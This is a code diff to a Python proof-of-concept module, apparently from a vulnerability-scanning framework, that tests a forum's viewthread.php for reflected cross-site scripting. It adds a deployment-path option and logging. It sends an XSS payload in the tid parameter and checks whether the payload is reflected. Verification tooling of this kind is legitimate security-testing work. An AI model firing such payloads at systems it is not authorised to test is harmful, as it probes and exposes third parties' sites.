@@ -31,13 +31,30 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
+        self.option_schema = {
+            'properties': {
+                'base_path': {
+                    'type': 'string',
+                    'description': '部署路径',
+                    'default': '',
+                    '$default_ref': {
+                        'property': 'base_path'
+                    }
+                }
+            }
+        }
 
     def verify(self):
+        target = self.target.rstrip('/') + '/' + \
+            (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = '/viewthread.php?tid="/><script>alert(233)</script>'
-            verify_url = '{target}'.format(target=self.target)+payload
+            verify_url = '{target}{payload}'.format(
+                target=target, payload=payload)
+
+            self.output.info('发送验证请求 {}'.format(verify_url))
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
             if '"/><script>alert(233)</script>' in content:
